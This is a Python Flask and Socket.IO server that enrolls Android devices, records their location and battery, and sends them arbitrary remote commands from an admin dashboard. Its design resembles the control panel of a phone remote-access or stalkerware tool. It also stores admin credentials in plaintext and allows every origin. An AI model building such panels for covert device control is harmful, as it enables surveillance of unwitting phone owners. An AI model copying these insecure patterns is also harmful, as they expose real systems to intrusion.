from flask import Flask, render_template, request, jsonify, session, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import secrets
import json
import os
import sqlite3
from datetime import datetime
import random
import string
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Generate admin credentials on startup
ADMIN_USERNAME = ''.join(random.choices(string.ascii_lowercase, k=8))
ADMIN_PASSWORD = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

# Save credentials
with open('credentials.txt', 'w') as f:
    f.write(f"Username: {ADMIN_USERNAME}\nPassword: {ADMIN_PASSWORD}\n")
    f.write(f"Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

print("\n" + "="*60)
print("🔐 ADMIN CREDENTIALS")
print("="*60)
print(f"Username: {ADMIN_USERNAME}")
print(f"Password: {ADMIN_PASSWORD}")
print("="*60)
print(f"Credentials saved to: credentials.txt")
print("="*60 + "\n")

# Database setup
def init_db():
    conn = sqlite3.connect('devices.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (device_id TEXT PRIMARY KEY,
                  device_name TEXT,
                  model TEXT,
                  android_version TEXT,
                  registered_at TEXT,
                  last_seen TEXT,
                  status TEXT,
                  location TEXT,
                  battery_level INTEGER,
                  ip_address TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS command_log
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT,
                  command TEXT,
                  params TEXT,
                  status TEXT,
                  executed_at TEXT)''')
    conn.commit()
    conn.close()

init_db()

# Store active devices
active_devices = {}

@app.route('/')
def index():
    if not session.get('logged_in'):
        return render_template('login.html')
    return render_template('dashboard.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        session['logged_in'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid credentials'}), 401

@app.route('/logout')
def logout():
    session.clear()
    return jsonify({'success': True})

@app.route('/api/devices')
def get_devices():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect('devices.db')
    c = conn.cursor()
    c.execute('SELECT * FROM devices ORDER BY last_seen DESC')
    devices = []
    for row in c.fetchall():
        devices.append({
            'device_id': row[0],
            'device_name': row[1],
            'model': row[2] or 'Unknown',
            'android_version': row[3] or 'Unknown',
            'registered_at': row[4],
            'last_seen': row[5],
            'status': row[6] or 'offline',
            'location': json.loads(row[7]) if row[7] else None,
            'battery_level': row[8] or 0,
            'ip_address': row[9] or '0.0.0.0'
        })
    conn.close()
    return jsonify(devices)

@app.route('/api/device/<device_id>/command', methods=['POST'])
def send_command(device_id):
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.get_json()
    command = data.get('command')
    
    if device_id in active_devices:
        try:
            socketio.emit('command', {
                'command': command,
                'params': data.get('params', {})
            }, room=active_devices[device_id])
            
            # Log command
            conn = sqlite3.connect('devices.db')
            c = conn.cursor()
            c.execute('''INSERT INTO command_log 
                        (device_id, command, params, status, executed_at)
                        VALUES (?, ?, ?, ?, ?)''',
                      (device_id, command, json.dumps(data.get('params', {})), 
                       'sent', datetime.now().isoformat()))
            conn.commit()
            conn.close()
            
            return jsonify({'success': True, 'message': f'Command {command} sent to device'})
        except Exception as e:
            return jsonify({'success': False, 'message': str(e)})
    else:
        return jsonify({'success': False, 'message': 'Device is offline'})

@app.route('/api/create_apk', methods=['POST'])
def create_apk():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    # Create a simple APK file (placeholder)
    apk_path = 'RemoteControl.apk'
    with open(apk_path, 'w') as f:
        f.write("This is a placeholder APK file.\n")
        f.write("To create a real APK, build the Android client with Android Studio.\n")
        f.write(f"Generated: {datetime.now()}\n")
    
    return send_file(apk_path, as_attachment=True, download_name='RemoteControl.apk')

@socketio.on('connect')
def handle_connect():
    print(f'Client connected: {request.sid}')

@socketio.on('device_register')
def handle_device_register(data):
    device_id = data.get('device_id')
    device_name = data.get('device_name', 'Android Device')
    
    active_devices[device_id] = request.sid
    
    conn = sqlite3.connect('devices.db')
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO devices 
                 (device_id, device_name, registered_at, last_seen, status)
                 VALUES (?, ?, ?, ?, ?)''',
              (device_id, device_name, datetime.now().isoformat(),
               datetime.now().isoformat(), 'online'))
    conn.commit()
    conn.close()
    
    emit('registration_success', {'status': 'registered'})
    socketio.emit('device_online', {'device_id': device_id, 'device_name': device_name})
    print(f'Device registered: {device_name} ({device_id})')

@socketio.on('device_heartbeat')
def handle_heartbeat(data):
    device_id = data.get('device_id')
    if device_id in active_devices:
        battery = data.get('battery', 0)
        location = data.get('location')
        
        conn = sqlite3.connect('devices.db')
        c = conn.cursor()
        c.execute('''UPDATE devices 
                     SET last_seen = ?, status = 'online', 
                         battery_level = ?, location = ?
                     WHERE device_id = ?''',
                  (datetime.now().isoformat(), battery, 
                   json.dumps(location) if location else None, device_id))
        conn.commit()
        conn.close()

@socketio.on('disconnect')
def handle_disconnect():
    for device_id, sid in list(active_devices.items()):
        if sid == request.sid:
            del active_devices[device_id]
            conn = sqlite3.connect('devices.db')
            c = conn.cursor()
            c.execute('UPDATE devices SET status = "offline" WHERE device_id = ?', (device_id,))
            conn.commit()
            conn.close()
            socketio.emit('device_offline', {'device_id': device_id})
            print(f'Device disconnected: {device_id}')
            break

if __name__ == '__main__':
    print("🚀 Starting Android Remote Control Server...")
    print(f"📍 Access dashboard at: http://localhost:5000")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
